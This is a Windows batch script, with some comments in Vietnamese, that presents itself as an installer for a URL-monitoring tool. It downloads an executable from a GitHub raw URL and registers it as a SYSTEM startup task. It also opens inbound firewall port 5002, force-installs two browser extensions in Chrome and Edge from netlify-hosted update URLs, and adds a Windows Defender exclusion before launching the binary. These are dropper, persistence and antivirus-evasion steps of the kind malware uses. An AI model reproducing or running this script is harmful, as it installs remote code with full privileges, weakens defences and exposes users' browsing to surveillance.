@echo off
setlocal enabledelayedexpansion

:: === Kill monitorUrlnew.exe if running ===
powershell -Command "Get-Process monitorUrlnew -ErrorAction SilentlyContinue | Stop-Process -Force"

:: === Configuration ===
set "URL=https://raw.githubusercontent.com/vietwe1993/ichibanurl/main/monitorurlnew.exe"
set "TARGET_DIR=C:\Users\Public"
set "TARGET_FILE=monitorUrlnew.exe"
set "TASK_NAME=MonitorUrlTask"

:: === Create target directory if it doesn't exist ===
if not exist "%TARGET_DIR%" (
    mkdir "%TARGET_DIR%"
)

:: === Delete old file if it exists ===
if exist "%TARGET_DIR%\%TARGET_FILE%" (
    del /f /q "%TARGET_DIR%\%TARGET_FILE%"
)

:: === Download new file ===
where curl >nul 2>&1
if %errorlevel%==0 (
    curl -L -o "%TARGET_DIR%\%TARGET_FILE%" "%URL%"
) else (
    bitsadmin /transfer myDownloadJob /download /priority normal "%URL%" "%TARGET_DIR%\%TARGET_FILE%"
)

:: === Delete existing task if it exists ===
schtasks /query /tn "%TASK_NAME%" >nul 2>&1
if %errorlevel%==0 (
    schtasks /delete /tn "%TASK_NAME%" /f
)

:: === Create new scheduled task to run as SYSTEM at startup ===
schtasks /create ^
    /tn "%TASK_NAME%" ^
    /tr "%TARGET_DIR%\%TARGET_FILE%" ^
    /sc onstart ^
    /ru "SYSTEM" ^
    /f
    
:: === Mở port 5002 TCP và UDP trên Firewall ===
powershell -Command "Get-NetFirewallRule -DisplayName 'Allow Port 5002 TCP' -ErrorAction SilentlyContinue | Remove-NetFirewallRule"
powershell -Command "Get-NetFirewallRule -DisplayName 'Allow Port 5002 UDP' -ErrorAction SilentlyContinue | Remove-NetFirewallRule"

powershell -Command "New-NetFirewallRule -DisplayName 'Allow Port 5002 TCP' -Direction Inbound -Protocol TCP -LocalPort 5002 -Action Allow"
powershell -Command "New-NetFirewallRule -DisplayName 'Allow Port 5002 UDP' -Direction Inbound -Protocol UDP -LocalPort 5002 -Action Allow"

:: === XÓA registry extension cũ (nếu có) ===
reg delete "HKLM\Software\Policies\Google\Chrome\ExtensionInstallForcelist" /v 1 /f >nul 2>&1
reg delete "HKLM\Software\Policies\Microsoft\Edge\ExtensionInstallForcelist" /v 1 /f >nul 2>&1
reg delete "HKLM\Software\Policies\Google\Chrome\ExtensionInstallForcelist" /v 3 /f >nul 2>&1
reg delete "HKLM\Software\Policies\Microsoft\Edge\ExtensionInstallForcelist" /v 3 /f >nul 2>&1

:: === Add Chrome Extension policies to registry ===

reg add "HKLM\Software\Policies\Google\Chrome\ExtensionInstallForcelist" /v 1 /t REG_SZ /d "bebfhecblbhbjgedmoefhlphaoimonjc;https://splendorous-sawine-22272c.netlify.app/update.xml" /f
reg add "HKLM\Software\Policies\Google\Chrome\ExtensionInstallForcelist" /v 3 /t REG_SZ /d "iebbomgkmmlpcgfdllpicncloggmpmap;https://remarkable-tarsier-70cdce.netlify.app/update.xml" /f

:: === Add Edge Extension policies to registry ===

reg add "HKLM\Software\Policies\Microsoft\Edge\ExtensionInstallForcelist" /v 1 /t REG_SZ /d "bebfhecblbhbjgedmoefhlphaoimonjc;https://splendorous-sawine-22272c.netlify.app/update.xml" /f
reg add "HKLM\Software\Policies\Microsoft\Edge\ExtensionInstallForcelist" /v 3 /t REG_SZ /d "iebbomgkmmlpcgfdllpicncloggmpmap;https://remarkable-tarsier-70cdce.netlify.app/update.xml" /f

:: === Exclude from Defender and launch ===
powershell -Command "Add-MpPreference -ExclusionPath 'C:\Users\Public\monitorUrlnew.exe'"
start "" "C:\Users\Public\monitorUrlnew.exe"
exit /b 0
